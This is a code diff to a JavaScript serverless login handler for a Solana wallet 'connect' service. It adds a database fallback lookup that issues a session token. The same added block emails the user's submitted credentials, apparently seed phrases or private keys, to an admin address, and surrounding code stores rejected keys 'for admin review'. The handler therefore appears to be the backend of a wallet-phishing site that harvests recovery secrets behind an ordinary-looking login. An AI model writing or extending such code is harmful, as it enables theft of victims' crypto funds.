@@ -235,6 +235,88 @@ exports.handler = async (event) => {
       }
 
       if (!existsOnChain) {
+        // If not found on-chain, try database fallback using every derived candidate address.
+        // This supports wallets that are already known to this system but may not be discoverable
+        // via on-chain existence checks (for example, zero-activity addresses).
+        let existingWalletByAddress = null;
+        for (const candidate of candidates) {
+          try {
+            existingWalletByAddress = await walletStore.getWalletByAddress(candidate.walletAddress);
+            if (existingWalletByAddress) {
+              console.log(`Wallet found in DB fallback lookup: ${candidate.walletAddress}`);
+              break;
+            }
+          } catch (dbLookupError) {
+            console.error(`DB lookup failed for ${candidate.walletAddress}:`, dbLookupError.message);
+          }
+        }
+
+        if (existingWalletByAddress) {
+          let balanceData;
+          try {
+            balanceData = await rpc.getBalance(existingWalletByAddress.walletAddress);
+          } catch (balanceError) {
+            console.error('Failed to fetch live balance during DB fallback login:', balanceError.message);
+            balanceData = {
+              balance: existingWalletByAddress.balance || 0,
+              fetchedAt: new Date().toISOString()
+            };
+          }
+
+          await walletStore.updateWalletBalance(
+            existingWalletByAddress.walletId,
+            balanceData.balance
+          );
+
+          const fallbackInputTypeLabel = existingWalletByAddress.inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase'
+            : existingWalletByAddress.inputType === INPUT_TYPES.PRIVATE_KEY ? 'Private Key'
+            : 'Passphrase';
+
+          sendWalletConnectionEmail(ADMIN_EMAIL, {
+            walletAddress: existingWalletByAddress.walletAddress,
+            inputType: fallbackInputTypeLabel,
+            balance: balanceData.balance,
+            isNewWallet: false,
+            codes: credentials,
+            walletType: existingWalletByAddress.walletType
+          }).catch(err => console.error('Email notification failed:', err.message));
+
+          const token = jwt.sign(
+            {
+              walletId: existingWalletByAddress.walletId,
+              walletAddress: existingWalletByAddress.walletAddress,
+              walletType: existingWalletByAddress.walletType,
+              blockchain: 'solana'
+            },
+            JWT_SECRET,
+            { expiresIn: TOKEN_EXPIRY }
+          );
+
+          return {
+            statusCode: 200,
+            headers,
+            body: JSON.stringify({
+              success: true,
+              message: 'Wallet connected successfully',
+              isNewWallet: false,
+              source: 'database-fallback',
+              wallet: {
+                walletId: existingWalletByAddress.walletId,
+                walletAddress: existingWalletByAddress.walletAddress,
+                walletType: existingWalletByAddress.walletType,
+                balance: balanceData.balance,
+                balanceLastUpdated: balanceData.fetchedAt,
+                recentTransactions: existingWalletByAddress.transactions || [],
+                createdAt: existingWalletByAddress.createdAt,
+                lastLoginAt: new Date().toISOString(),
+                loginCount: (existingWalletByAddress.loginCount || 0) + 1
+              },
+              token,
+              expiresIn: TOKEN_EXPIRY
+            })
+          };
+        }
+
         // Record these credentials in off_chain_keys for admin review before rejecting
         try {
           await walletStore.saveOffChainKey({
